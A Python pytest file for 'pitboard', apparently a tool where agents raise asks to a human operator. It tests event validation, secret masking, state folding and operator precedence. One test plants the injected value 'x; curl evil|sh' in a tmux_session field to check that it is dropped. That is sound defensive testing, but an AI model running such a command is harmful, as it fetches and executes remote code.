"""G1: the event format. Test names carry the codon IDs (plan rule 2)."""
import json

import pytest

from pitboard import contract as c

UID = "6a1e4c2b9d8f4a7e8c3b2a1d0e9f8c7b"


def ev(etype, data, *, ts="2026-11-15T13:00:00.000Z", by="agent", ask="A1", uid=UID, **kw):
    e = c.make_event(etype, uid=uid, ask=ask, lane="api-server", lane_name="API Server",
                     machine="studio-1", session_id="s-1", by=by, data=data, ts=ts)
    e.update(kw)
    return e


def asked(**data):
    d = {"kind": "decision", "severity": "blocking", "title": "Merge #651 now?",
         "suggested": "merge now", "source": "agent"}
    d.update(data)
    return d


# ---------------------------------------------------------------- G1.1

def test_G1_1_one_compact_utf8_line():
    e = ev("asked", asked(title="Café ☕ ok?"))
    raw = c.serialize(e)
    assert raw.endswith(b"\n") and raw.count(b"\n") == 1
    text = raw.decode("utf-8")
    assert "Café ☕" in text            # ensure_ascii off
    assert ", " not in text and ": " not in text.replace("Merge", "")  # compact separators
    assert json.loads(text) == e


def test_G1_1_line_over_16384_bytes_is_refused():
    big = "\U0001F600"  # 4 bytes in UTF-8: every field at its limit passes 16 384 bytes
    e = ev("asked", asked(kind="hand", suggested=None, steps=[big * 200] * 10,
                          detail=big * 2000, why=big * 500))
    e["lane_name"] = "x" * 120
    e["data"]["where"] = {"cwd": big * 500}
    with pytest.raises(c.ContractError, match="bytes"):
        c.serialize(e)


# ---------------------------------------------------------------- G1.2

def test_G1_2_envelope_has_exactly_the_fields():
    e = ev("asked", asked())
    assert set(e) == set(c.ENVELOPE_KEYS)
    assert c.is_valid(e)


@pytest.mark.parametrize("field,value", [
    ("v", 2), ("v", True), ("event_id", "XYZ"), ("uid", "0" * 31), ("type", "deleted"),
    ("ask", "A0"), ("ask", "A012"), ("ask", "B1"), ("lane", "Has Space"), ("lane", "-x"),
    ("lane_name", ""), ("lane_name", "x" * 121), ("machine", "Studio"), ("session_id", 5),
    ("ts", "2026-11-15T13:00:00Z"), ("origin", "cloud"), ("by", "robot"), ("data", []),
])
def test_G1_2_each_envelope_rule(field, value):
    e = ev("asked", asked())
    e[field] = value
    assert not c.is_valid(e)


def test_G1_2_missing_field():
    e = ev("asked", asked())
    del e["origin"]
    assert "origin is missing" in c.errors_of(e)


# ---------------------------------------------------------------- G1.3

def test_G1_3_asked_valid_kinds():
    assert c.is_valid(ev("asked", asked(kind="question")))
    assert c.is_valid(ev("asked", asked(kind="hand", suggested=None, steps=["Go to the site"])))
    assert c.is_valid(ev("asked", asked(kind="permission", suggested=None, source="permission")))


def test_G1_3_suggested_required_for_question_and_decision():
    for kind in ("question", "decision"):
        assert not c.is_valid(ev("asked", asked(kind=kind, suggested=None)))
        assert not c.is_valid(ev("asked", asked(kind=kind, suggested="")))


def test_G1_3_hand_needs_1_to_10_steps():
    assert not c.is_valid(ev("asked", asked(kind="hand", suggested=None)))
    assert not c.is_valid(ev("asked", asked(kind="hand", suggested=None, steps=[])))
    assert not c.is_valid(ev("asked", asked(kind="hand", suggested=None, steps=["s"] * 11)))
    assert not c.is_valid(ev("asked", asked(kind="hand", suggested=None, steps=["x" * 201])))


@pytest.mark.parametrize("key,bad", [
    ("title", ""), ("title", "x" * 121), ("title", "two\nlines"), ("detail", "x" * 2001),
    ("why", "x" * 501), ("suggested", "x" * 501), ("severity", "high"), ("kind", "chat"),
    ("source", "web"), ("deadline", "tomorrow"),
])
def test_G1_3_field_limits(key, bad):
    assert not c.is_valid(ev("asked", asked(**{key: bad})))


def test_G1_3_where_bad_values_are_dropped_not_refused():
    w = {"cwd": "/home/dev/api", "host": "studio-1", "tmux_session": "x; curl evil|sh",
         "tmux_pane": "%12", "extra": "no"}
    assert c.clean_where(w) == {"cwd": "/home/dev/api", "host": "studio-1", "tmux_pane": "%12"}
    p = c.prepare(ev("asked", asked(where=w)))
    assert "tmux_session" not in p["data"]["where"] and "extra" not in p["data"]["where"]


# ---------------------------------------------------------------- G1.4 to G1.8

def test_G1_4_updated_needs_a_mutable_field():
    assert c.is_valid(ev("updated", {"severity": "urgent"}))
    assert not c.is_valid(ev("updated", {}))
    assert not c.is_valid(ev("updated", {"kind": "hand"}))  # kind never changes


def test_G1_5_answered():
    assert c.is_valid(ev("answered", {"answer": "yes", "via": "ok"}))
    assert not c.is_valid(ev("answered", {"answer": "", "via": "ok"}))
    assert not c.is_valid(ev("answered", {"answer": "yes", "via": "email"}))


def test_G1_6_done_note_optional():
    assert c.is_valid(ev("done", {}))
    assert c.is_valid(ev("done", {"note": "Merged."}))
    assert not c.is_valid(ev("done", {"note": "x" * 501}))


def test_G1_7_withdrawn_reason_required():
    assert c.is_valid(ev("withdrawn", {"reason": "moot"}))
    assert not c.is_valid(ev("withdrawn", {}))
    assert not c.is_valid(ev("withdrawn", {"reason": "x" * 501}))


def test_G1_8_reopened_reason_required():
    assert c.is_valid(ev("reopened", {"reason": "it matters again"}))
    assert not c.is_valid(ev("reopened", {}))
    assert not c.is_valid(ev("reopened", {"reason": ""}))


def test_G1_11_apply_event_matches_fold():
    seq = [ev("asked", asked(), ts="2026-11-15T13:00:00.000Z"),
           ev("answered", {"answer": "a", "via": "ok"}, by="operator", ts="2026-11-15T13:01:00.000Z")]
    asks = {}
    assert c.apply_event(asks, seq[0]) and c.apply_event(asks, seq[1])
    assert not c.apply_event(asks, ev("asked", asked(), ts="2026-11-15T13:02:00.000Z"))
    folded, stats = c.fold(seq)
    assert asks == folded
    assert stats["max_ask"] == 1 and stats["last_applied"] == [seq[1]["ts"], seq[1]["event_id"]]
    assert folded[UID]["session_id"] == "s-1"


# ---------------------------------------------------------------- G1.9

def test_G1_9_mask_first_then_validate():
    # 118 chars + a short password value: masking lengthens it past 120, so refuse mode refuses
    title = "x" * 110 + " pwd=ab"
    with pytest.raises(c.ContractError, match="title"):
        c.prepare(ev("asked", asked(title=title)))
    p = c.prepare(ev("asked", asked(title=title)), mode="cut")
    assert len(p["data"]["title"]) == 120 and p["data"]["title"].endswith(c.CUT_MARK)


def test_G1_9_cut_mode_cuts_hook_text():
    p = c.prepare(ev("asked", asked(title="t" * 300, detail="d" * 5000)), mode="cut")
    assert len(p["data"]["title"]) == 120 and len(p["data"]["detail"]) == 2000


def test_G1_9_reader_skips_bad_lines_and_counts_them():
    good = c.serialize(ev("asked", asked())).decode()
    raw = good + "not json\n" + "[1,2]\n" + good.replace('"v":1', '"v":1,"x":1')[:-1]  # torn last line
    events, bad = c.read_events(raw)
    assert len(events) == 1 and bad == 2


# ---------------------------------------------------------------- G1.10, G1.11

def test_G1_10_G1_11_full_round():
    events = [
        ev("asked", asked(), ts="2026-11-15T13:00:00.000Z"),
        ev("answered", {"answer": "merge now", "via": "ok"}, by="operator", ts="2026-11-17T19:04:05.123Z"),
        ev("done", {"note": "Merged."}, ts="2026-11-17T19:06:41.002Z"),
    ]
    asks, stats = c.fold(events)
    st = asks[UID]
    assert st["status"] == "done" and st["answer"] == "merge now" and st["answered_by"] == "operator"
    assert st["asked_at"] == "2026-11-15T13:00:00.000Z" and st["done_note"] == "Merged."
    assert st["events"] == 3 and stats["applied"] == 3 and st["status"] in c.STATUSES


def test_G1_11_order_is_by_ts_not_file_order():
    a = ev("asked", asked(), ts="2026-11-15T13:00:00.000Z")
    d = ev("done", {}, ts="2026-11-15T14:00:00.000Z")
    asks, _ = c.fold([d, a])
    assert asks[UID]["status"] == "done"


@pytest.mark.parametrize("start,etype,data,expect", [
    ("open", "asked", None, "open"),
    ("open", "reopened", {"reason": "r"}, "open"),
    ("done", "answered", {"answer": "x", "via": "text"}, "done"),
    ("done", "withdrawn", {"reason": "r"}, "done"),
    ("done", "updated", {"title": "New?"}, "done"),
    ("withdrawn", "done", {}, "withdrawn"),
    ("answered", "reopened", {"reason": "again"}, "open"),
    ("withdrawn", "reopened", {"reason": "again"}, "open"),
    ("open", "withdrawn", {"reason": "moot"}, "withdrawn"),
    ("open", "done", {}, "done"),
])
def test_G1_11_transition_table(start, etype, data, expect):
    seq = [ev("asked", asked(), ts="2026-11-15T13:00:00.000Z")]
    to_start = {
        "open": [],
        "answered": [ev("answered", {"answer": "a", "via": "ok"}, by="operator", ts="2026-11-15T13:01:00.000Z")],
        "done": [ev("done", {}, ts="2026-11-15T13:01:00.000Z")],
        "withdrawn": [ev("withdrawn", {"reason": "w"}, ts="2026-11-15T13:01:00.000Z")],
    }
    seq += to_start[start]
    seq.append(ev(etype, data if data is not None else asked(), ts="2026-11-15T13:02:00.000Z"))
    asks, _ = c.fold(seq)
    assert asks[UID]["status"] == expect


def test_G1_11_events_before_asked_are_ignored():
    asks, stats = c.fold([ev("done", {}, ts="2026-11-15T12:00:00.000Z")])
    assert asks == {} and stats["ignored"] == 1


def test_G1_11_reopen_clears_the_round():
    seq = [ev("asked", asked(), ts="2026-11-15T13:00:00.000Z"),
           ev("answered", {"answer": "a", "via": "ok"}, by="operator", ts="2026-11-15T13:01:00.000Z"),
           ev("reopened", {"reason": "again"}, ts="2026-11-15T13:02:00.000Z")]
    st = c.fold(seq)[0][UID]
    assert st["status"] == "open" and st["answer"] is None and st["answered_at"] is None


def test_G1_11_update_applies_fields():
    seq = [ev("asked", asked(), ts="2026-11-15T13:00:00.000Z"),
           ev("updated", {"severity": "urgent", "steps": ["a"]}, ts="2026-11-15T13:01:00.000Z")]
    st = c.fold(seq)[0][UID]
    assert st["severity"] == "urgent" and st["steps"] == ["a"] and st["kind"] == "decision"


# ---------------------------------------------------------------- G1.12

def test_G1_12_short_ids_never_reused():
    seq = [ev("asked", asked(), ask="A1"), ev("asked", asked(), ask="A7", uid="1" * 32),
           ev("withdrawn", {"reason": "x"}, ask="A7", uid="1" * 32)]
    assert c.next_ask_id(seq) == "A8"
    assert c.next_ask_id([]) == "A1"


# ---------------------------------------------------------------- G1.13

def test_G1_13_unknown_fields_are_ignored():
    e = ev("asked", asked())
    e["future_field"] = {"x": 1}
    e["data"]["also_new"] = 2
    assert c.is_valid(e)
    assert c.fold([e])[0][UID]["status"] == "open"


# ---------------------------------------------------------------- invariants

def test_INV3_same_event_twice_is_once():
    a = ev("asked", asked())
    d = ev("done", {}, ts="2026-11-16T00:00:00.000Z")
    once, _ = c.fold([a, d])
    twice, stats = c.fold([a, d, a, d])
    assert once == twice and stats["duplicate"] == 2


def test_INV9_newer_version_and_unknown_type_are_skipped():
    a = ev("asked", asked())
    newer = ev("done", {}, ts="2026-11-16T00:00:00.000Z")
    newer["v"] = 2
    odd = ev("snoozed", {}, ts="2026-11-16T00:00:01.000Z")
    asks, stats = c.fold([a, newer, odd])
    assert asks[UID]["status"] == "open" and stats["skipped"] == 2


def test_INV10_agent_never_replaces_operator_answer():
    seq = [ev("asked", asked(), ts="2026-11-15T13:00:00.000Z"),
           ev("answered", {"answer": "operator says no", "via": "text"}, by="operator", ts="2026-11-15T13:01:00.000Z"),
           ev("answered", {"answer": "agent says yes", "via": "text"}, by="agent", ts="2026-11-15T13:02:00.000Z")]
    st = c.fold(seq)[0][UID]
    assert st["answer"] == "operator says no" and st["answered_by"] == "operator"


def test_INV10_operator_replaces_agent_answer():
    seq = [ev("asked", asked(), ts="2026-11-15T13:00:00.000Z"),
           ev("answered", {"answer": "agent noted", "via": "text"}, by="agent", ts="2026-11-15T13:01:00.000Z"),
           ev("answered", {"answer": "from the page", "via": "page"}, by="operator", ts="2026-11-15T13:02:00.000Z")]
    st = c.fold(seq)[0][UID]
    assert st["answer"] == "from the page" and st["answered_via"] == "page"


def test_INV4_times_are_stored_utc_ms_z():
    assert c.TS.match(c.now_ts())
    assert c.ts_of(c.parse_ts("2026-11-15T13:00:00.123Z")) == "2026-11-15T13:00:00.123Z"
